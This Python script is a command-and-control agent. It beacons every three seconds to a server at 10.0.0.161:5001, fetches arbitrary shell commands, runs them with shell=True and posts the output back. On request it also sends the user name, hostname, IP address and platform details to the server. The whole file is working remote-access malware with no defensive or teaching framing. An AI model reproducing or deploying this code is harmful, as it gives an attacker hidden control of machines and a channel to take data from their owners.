import http.client
import json
import socket
import platform
import os
import subprocess
import time
import getpass

SERVER_HOST = "10.0.0.161"
SERVER_PORT = 5001

def get_system_info():
    return {
        "user": getpass.getuser(),
        "hostname": socket.gethostname(),
        "ip": get_ip(),
        "platform": platform.system(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "uptime_sec": get_uptime()
    }

def get_uptime():
    try:
        if os.name == 'posix':
            if platform.system() == 'Darwin':
                # macOS
                output = subprocess.check_output("sysctl -n kern.boottime", shell=True, text=True)
                boot_time = int(output.split('sec =')[1].split(',')[0].strip())
                return int(time.time() - boot_time)
            else:
                # Linux
                with open('/proc/uptime', 'r') as f:
                    return int(float(f.readline().split()[0]))
        else:
            return "Unknown"
    except:
        return "Unknown"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())

def post_info():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        headers = {"Content-type": "application/json"}
        payload = json.dumps(get_system_info())
        conn.request("POST", "/post_info", body=payload, headers=headers)
        conn.getresponse()
    except Exception as e:
        print(f"[!] Error sending system info: {e}")

def check_info_request():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/should_post_info")
        response = conn.getresponse()
        if response.status == 200:
            result = response.read().decode().strip()
            if result == "yes":
                post_info()
    except Exception as e:
        print(f"[!] Error checking for system info request: {e}")

def get_command():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/get_command")
        response = conn.getresponse()
        if response.status == 200:
            return response.read().decode().strip()
    except Exception as e:
        print(f"[!] Error getting command: {SERVER_HOST}:{e}")
    return None

def send_result(result):
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        headers = {"Content-type": "application/json"}
        payload = json.dumps({"result": result})
        conn.request("POST", "/post_result", body=payload, headers=headers)
        conn.getresponse()
    except Exception as e:
        print(f"[!] Error sending result: {e}")

def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return output

def main():
    while True:
        check_info_request()
        cmd = get_command()
        if cmd and cmd.lower() != "none":
            print(f"[+] Received command: {cmd}")
            output = run_command(cmd)
            send_result(output)
        time.sleep(3)

if __name__ == "__main__":
    main()
